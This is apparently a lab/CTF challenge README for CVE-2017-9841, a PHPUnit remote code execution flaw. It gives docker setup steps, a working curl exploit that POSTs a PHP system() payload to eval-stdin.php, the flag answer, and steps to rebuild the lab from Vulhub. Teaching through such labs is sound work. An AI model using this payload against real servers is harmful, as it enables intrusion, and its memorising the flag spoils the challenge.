# Challenge 6: PHPUnit

## How to Start
```bash
docker compose pull
docker compose up
```

---

## Description
This challenge teaches the user about **CVE-2017-9841**, a vulnerability in PHPUnit that allows **Remote Code Execution (RCE)**.

---

## Solution
1. Use the terminal to locate the vulnerable `eval-stdin.php` file.
2. Exploit it using a `POST` request with a malicious PHP payload.
3. Example command to retrieve the flag:
   ```bash
   curl -s -X POST http://localhost:8050/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php    -d "<?php system('cat /var/www/html/flag.txt'); ?>"
   ```

**Flag:**
```
flag{phpunit_pwned_rce}
```

---

## How to Recreate

### 1. Clone Vulhub Repository
```bash
git clone https://github.com/vulhub/vulhub
```

### 2. Navigate to PHPUnit CVE Directory
```bash
cd vulhub/phpunit/CVE-2017-9841
```

### 3. Build and Start Containers
```bash
docker-compose up -d
```

### 4. Create the Flag
```bash
docker exec phpunit_web_1 sh -c "echo 'flag{phpunit_pwned_rce}' > /var/www/html/flag.txt"
```

---

## Final Notes
This challenge demonstrates how outdated development dependencies can be exploited for remote code execution.  
Always ensure unused packages like PHPUnit are not exposed in production environments.
